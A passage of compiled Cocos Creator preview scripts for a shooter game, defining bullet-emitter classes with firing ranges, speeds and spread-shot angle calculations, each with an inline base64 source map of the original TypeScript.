WUFDMUMsSUFBSSxJQUFJLEdBQUcsVUFBVSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsVUFBVSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQztZQUNqRSxNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDL0IsQ0FBQyxDQUFDLENBQUM7UUFDSCxNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDMUIsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsS0FBSyxDQUFDO1FBQzdCLE1BQU0sQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLE9BQU8sR0FBRyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxVQUFVLENBQUMsTUFBTSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQzFFLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLElBQUksQ0FBQyxLQUFLLENBQUMsR0FBRyxDQUFDLENBQUMsRUFBRSxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUMvRSxHQUFHLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxXQUFXLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDNUMsQ0FBQztJQUVMLHlCQUFDO0FBQUQsQ0F4QkEsQUF3QkMsQ0F4QitDLHVCQUFhLEdBd0I1RCIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0RW1pdHRlciBmcm9tIFwiLi9CdWxsZXRFbWl0dGVyXCI7XHJcbmltcG9ydCBHYW1lQnVsbGV0c0NvbnRyb2xsZXIgZnJvbSBcIi4uLy4uL2dhbWUvR2FtZUJ1bGxldHNDb250cm9sbGVyXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi8uLi9pbmZvL1dvcmxkXCI7XHJcblxyXG5jb25zdCBtYWduaWZ5ID0gMTtcclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldEVtaXR0ZXJQZW5aaSBleHRlbmRzIEJ1bGxldEVtaXR0ZXIge1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSA4MDA7XHJcbiAgICAgICAgdGhpcy5faW50ZXJ2YWwgPSAwLjA1O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMTUwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50LS07XHJcbiAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuUGVuWmkpO1xyXG4gICAgICAgIGxldCBza2UgPSBidWxsZXQuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICBza2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigodHJhY2tFbnRyeSwgbG9vcENvdW50KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydDtcclxuICAgICAgICBidWxsZXQubm9kZS5zY2FsZSA9IG1hZ25pZnkgKiBXb3JsZC5NeS5hcm1vcnkubWFnbmlmeU11bChidWxsZXQuYnVsbGV0SWQpO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnJvdGF0aW9uID0gOTAgLSBjYy5taXNjLnJhZGlhbnNUb0RlZ3JlZXMoTWF0aC5hdGFuMihkaXIueSwgZGlyLngpKTtcclxuICAgICAgICBza2Uuc2V0QW5pbWF0aW9uKDAsIFwiYW5pbWF0aW9uXCIsIGZhbHNlKTtcclxuICAgIH1cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterJuJiQiang.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '7e91aqtLv1DgokxbtjCsUYR', 'BulletEmitterJuJiQiang');
// script/app/entities/bulletEmitter/BulletEmitterJuJiQiang.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterJuJiQiang = /** @class */ (function (_super) {
    __extends(BulletEmitterJuJiQiang, _super);
    function BulletEmitterJuJiQiang(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 2000;
        _this._interval = 0.5;
        _this._speed = 2000;
        return _this;
    }
    BulletEmitterJuJiQiang.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JuJiQiang);
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.fly(dir, this._firingRange, this._speed);
    };
    return BulletEmitterJuJiQiang;
}(BulletEmitter_1.default));
exports.default = BulletEmitterJuJiQiang;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckp1SmlRaWFuZy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaURBQTRDO0FBRzVDO0lBQW9ELDBDQUFhO0lBRTdELGdDQUFZLHFCQUEyQztRQUF2RCxZQUNJLGtCQUFNLHFCQUFxQixDQUFDLFNBSS9CO1FBSEcsS0FBSSxDQUFDLFlBQVksR0FBRyxJQUFJLENBQUM7UUFDekIsS0FBSSxDQUFDLFNBQVMsR0FBRyxHQUFHLENBQUM7UUFDckIsS0FBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7O0lBQ3ZCLENBQUM7SUFFRCxxQ0FBSSxHQUFKLFVBQUssS0FBYyxFQUFFLEdBQVk7UUFDN0IsSUFBSSxDQUFDLFdBQVcsRUFBRSxDQUFDO1FBQ25CLElBQUksTUFBTSxHQUFHLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxpQkFBaUIsQ0FBQyx1QkFBYSxDQUFDLEtBQUssQ0FBQyxTQUFTLENBQUMsQ0FBQztRQUN6RixNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDMUIsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsS0FBSyxDQUFDO1FBQzdCLE1BQU0sQ0FBQyxHQUFHLENBQUMsR0FBRyxFQUFFLElBQUksQ0FBQyxZQUFZLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO0lBQ3BELENBQUM7SUFDTCw2QkFBQztBQUFELENBaEJBLEFBZ0JDLENBaEJtRCx1QkFBYSxHQWdCaEUiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXIgZnJvbSBcIi4vQnVsbGV0RW1pdHRlclwiO1xyXG5pbXBvcnQgR2FtZUJ1bGxldHNDb250cm9sbGVyIGZyb20gXCIuLi8uLi9nYW1lL0dhbWVCdWxsZXRzQ29udHJvbGxlclwiO1xyXG5cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0RW1pdHRlckp1SmlRaWFuZyBleHRlbmRzIEJ1bGxldEVtaXR0ZXIge1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSAyMDAwO1xyXG4gICAgICAgIHRoaXMuX2ludGVydmFsID0gMC41O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMjAwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50LS07XHJcbiAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuSnVKaVFpYW5nKTtcclxuICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gc3RhcnQ7XHJcbiAgICAgICAgYnVsbGV0LmZseShkaXIsIHRoaXMuX2ZpcmluZ1JhbmdlLCB0aGlzLl9zcGVlZCk7XHJcbiAgICB9XHJcbn1cclxuXHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterShouQiang.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f0d58H7ssBLXIO9MZmgW0N8', 'BulletEmitterShouQiang');
// script/app/entities/bulletEmitter/BulletEmitterShouQiang.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterShouQiang = /** @class */ (function (_super) {
    __extends(BulletEmitterShouQiang, _super);
    function BulletEmitterShouQiang(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 800;
        _this._interval = 0.05;
        _this._speed = 1500;
        return _this;
    }
    BulletEmitterShouQiang.prototype.fire = function (start, dir) {
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.ShouQiang);
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.fly(dir, this._firingRange, this._speed);
    };
    return BulletEmitterShouQiang;
}(BulletEmitter_1.default));
exports.default = BulletEmitterShouQiang;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclNob3VRaWFuZy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaURBQTRDO0FBSzVDO0lBQW9ELDBDQUFhO0lBRTdELGdDQUFZLHFCQUEyQztRQUF2RCxZQUNJLGtCQUFNLHFCQUFxQixDQUFDLFNBSS9CO1FBSEcsS0FBSSxDQUFDLFlBQVksR0FBRyxHQUFHLENBQUM7UUFDeEIsS0FBSSxDQUFDLFNBQVMsR0FBRyxJQUFJLENBQUM7UUFDdEIsS0FBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7O0lBQ3ZCLENBQUM7SUFFRCxxQ0FBSSxHQUFKLFVBQUssS0FBYyxFQUFFLEdBQVk7UUFDN0IsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFNBQVMsQ0FBQyxDQUFDO1FBQ3pGLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMxQixNQUFNLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUM7UUFDN0IsTUFBTSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDcEQsQ0FBQztJQUNMLDZCQUFDO0FBQUQsQ0FmQSxBQWVDLENBZm1ELHVCQUFhLEdBZWhFIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuL0J1bGxldEVtaXR0ZXJcIjtcclxuaW1wb3J0IEdhbWVCdWxsZXRzQ29udHJvbGxlciBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lQnVsbGV0c0NvbnRyb2xsZXJcIjtcclxuXHJcblxyXG5cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0RW1pdHRlclNob3VRaWFuZyBleHRlbmRzIEJ1bGxldEVtaXR0ZXIge1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSA4MDA7XHJcbiAgICAgICAgdGhpcy5faW50ZXJ2YWwgPSAwLjA1O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMTUwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5TaG91UWlhbmcpO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydDtcclxuICAgICAgICBidWxsZXQuZmx5KGRpciwgdGhpcy5fZmlyaW5nUmFuZ2UsIHRoaXMuX3NwZWVkKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterSanDanQiang.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'fb678niczNL5ILsd5k556at', 'BulletEmitterSanDanQiang');
// script/app/entities/bulletEmitter/BulletEmitterSanDanQiang.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var BulletEmitterSanDanQiang = /** @class */ (function (_super) {
    __extends(BulletEmitterSanDanQiang, _super);
    function BulletEmitterSanDanQiang(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 900;
        _this._interval = 0.1;
        _this._speed = 1500;
        return _this;
    }
    BulletEmitterSanDanQiang.prototype.fire = function (start, dir) {
        var _this = this;
        this.bulletCount--;
        var powerLv = World_1.World.My.armory.levelOfEmitterPower(this._bulletEmitterID);
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp);
        var add = config[powerLv - 1]['bullet_split'];
        var num = 3 + 2 * add;
        var angle = 10 + 5 * add;
        var degrees = [];
        var half = Math.floor(num / 2);
        for (var i = 0; i < half; i++) {
            var a = (i + 1) * angle / half;
            degrees.push(a);
            degrees.push(-a);
        }
        if (num % 2 == 1) {
            degrees.push(0);
        }
        degrees.forEach(function (value) {
            var bullet = _this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.SanDanQiang);
            bullet.node.active = true;
            bullet.node.position = start;
            bullet.fly(dir.rotate(cc.misc.degreesToRadians(value)), _this._firingRange, _this._speed);
        });
    };
    return BulletEmitterSanDanQiang;
}(BulletEmitter_1.default));
exports.default = BulletEmitterSanDanQiang;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclNhbkRhblFpYW5nLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSxpREFBNEM7QUFDNUMsMENBQXVDO0FBQ3ZDLHdFQUFxRTtBQUNyRSxnRUFBNkQ7QUFJN0Q7SUFBc0QsNENBQWE7SUFFL0Qsa0NBQVkscUJBQTJDO1FBQXZELFlBQ0ksa0JBQU0scUJBQXFCLENBQUMsU0FJL0I7UUFIRyxLQUFJLENBQUMsWUFBWSxHQUFHLEdBQUcsQ0FBQztRQUN4QixLQUFJLENBQUMsU0FBUyxHQUFHLEdBQUcsQ0FBQztRQUNyQixLQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQzs7SUFDdkIsQ0FBQztJQUVELHVDQUFJLEdBQUosVUFBSyxLQUFjLEVBQUUsR0FBWTtRQUFqQyxpQkF1QkM7UUF0QkcsSUFBSSxDQUFDLFdBQVcsRUFBRSxDQUFDO1FBQ25CLElBQUksT0FBTyxHQUFHLGFBQUssQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLG1CQUFtQixDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDO1FBQ3pFLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsUUFBUSxDQUFDLENBQUM7UUFDakUsSUFBSSxHQUFHLEdBQUcsTUFBTSxDQUFDLE9BQU8sR0FBQyxDQUFDLENBQUMsQ0FBQyxjQUFjLENBQUMsQ0FBQztRQUM1QyxJQUFJLEdBQUcsR0FBRyxDQUFDLEdBQUcsQ0FBQyxHQUFHLEdBQUcsQ0FBQztRQUN0QixJQUFJLEtBQUssR0FBRyxFQUFFLEdBQUMsQ0FBQyxHQUFDLEdBQUcsQ0FBQztRQUNyQixJQUFJLE9BQU8sR0FBRyxFQUFFLENBQUM7UUFDakIsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDN0IsS0FBSyxJQUFJLENBQUMsR0FBQyxDQUFDLEVBQUUsQ0FBQyxHQUFHLElBQUksRUFBRSxDQUFDLEVBQUUsRUFBQztZQUN4QixJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBQyxDQUFDLENBQUMsR0FBQyxLQUFLLEdBQUMsSUFBSSxDQUFDO1lBQ3pCLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUM7WUFDaEIsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1NBQ3BCO1FBQ0QsSUFBSSxHQUFHLEdBQUMsQ0FBQyxJQUFJLENBQUMsRUFBQztZQUNYLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUM7U0FDbkI7UUFDRCxPQUFPLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSztZQUNqQixJQUFJLE1BQU0sR0FBRyxLQUFJLENBQUMscUJBQXFCLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsV0FBVyxDQUFDLENBQUM7WUFDM0YsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1lBQzFCLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQztZQUM3QixNQUFNLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxLQUFLLENBQUMsQ0FBQyxFQUFFLEtBQUksQ0FBQyxZQUFZLEVBQUUsS0FBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQzVGLENBQUMsQ0FBQyxDQUFDO0lBQ1AsQ0FBQztJQUNMLCtCQUFDO0FBQUQsQ0FqQ0EsQUFpQ0MsQ0FqQ3FELHVCQUFhLEdBaUNsRSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgR2FtZUJ1bGxldHNDb250cm9sbGVyIGZyb20gXCIuLi8uLi9nYW1lL0dhbWVCdWxsZXRzQ29udHJvbGxlclwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlciBmcm9tIFwiLi9CdWxsZXRFbWl0dGVyXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi8uLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5cclxuXHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRFbWl0dGVyU2FuRGFuUWlhbmcgZXh0ZW5kcyBCdWxsZXRFbWl0dGVyIHtcclxuXHJcbiAgICBjb25zdHJ1Y3RvcihnYW1lQnVsbGV0c0NvbnRyb2xsZXI6R2FtZUJ1bGxldHNDb250cm9sbGVyKXtcclxuICAgICAgICBzdXBlcihnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgIHRoaXMuX2ZpcmluZ1JhbmdlID0gOTAwO1xyXG4gICAgICAgIHRoaXMuX2ludGVydmFsID0gMC4xO1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMTUwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50LS07XHJcbiAgICAgICAgbGV0IHBvd2VyTHYgPSBXb3JsZC5NeS5hcm1vcnkubGV2ZWxPZkVtaXR0ZXJQb3dlcih0aGlzLl9idWxsZXRFbWl0dGVySUQpO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcCk7XHJcbiAgICAgICAgbGV0IGFkZCA9IGNvbmZpZ1twb3dlckx2LTFdWydidWxsZXRfc3BsaXQnXTtcclxuICAgICAgICBsZXQgbnVtID0gMyArIDIgKiBhZGQ7XHJcbiAgICAgICAgbGV0IGFuZ2xlID0gMTArNSphZGQ7XHJcbiAgICAgICAgbGV0IGRlZ3JlZXMgPSBbXTtcclxuICAgICAgICBsZXQgaGFsZiA9IE1hdGguZmxvb3IobnVtLzIpO1xyXG4gICAgICAgIGZvciAobGV0IGk9MDsgaSA8IGhhbGY7IGkrKyl7XHJcbiAgICAgICAgICAgIGxldCBhID0gKGkrMSkqYW5nbGUvaGFsZjtcclxuICAgICAgICAgICAgZGVncmVlcy5wdXNoKGEpO1xyXG4gICAgICAgICAgICBkZWdyZWVzLnB1c2goLWEpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAobnVtJTIgPT0gMSl7XHJcbiAgICAgICAgICAgIGRlZ3JlZXMucHVzaCgwKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgZGVncmVlcy5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuU2FuRGFuUWlhbmcpO1xyXG4gICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICBidWxsZXQubm9kZS5wb3NpdGlvbiA9IHN0YXJ0O1xyXG4gICAgICAgICAgICBidWxsZXQuZmx5KGRpci5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKHZhbHVlKSksIHRoaXMuX2ZpcmluZ1JhbmdlLCB0aGlzLl9zcGVlZCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterShanDianQiu.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1d278R1B3RH6KmJMSOmnfUe', 'BulletEmitterShanDianQiu');
// script/app/entities/bulletEmitter/BulletEmitterShanDianQiu.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var World_1 = require("../../info/World");
var magnify = 1;
var BulletEmitterShanDianQiu = /** @class */ (function (_super) {
    __extends(BulletEmitterShanDianQiu, _super);
    function BulletEmitterShanDianQiu(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 1000;
        _this._interval = 0.45;
        _this._speed = 300;
        return _this;
    }
    BulletEmitterShanDianQiu.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.ShanDianQiu);
        bullet.node.active = true;
        bullet.node.position = start /*.add(dir.mul((<cc.CircleCollider>bullet.collider).radius))*/;
        bullet.node.scale = magnify * World_1.World.My.armory.magnifyMul(bullet.bulletId);
        bullet.fly(dir, this._firingRange, this._speed);
    };
    return BulletEmitterShanDianQiu;
}(BulletEmitter_1.default));
exports.default = BulletEmitterShanDianQiu;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
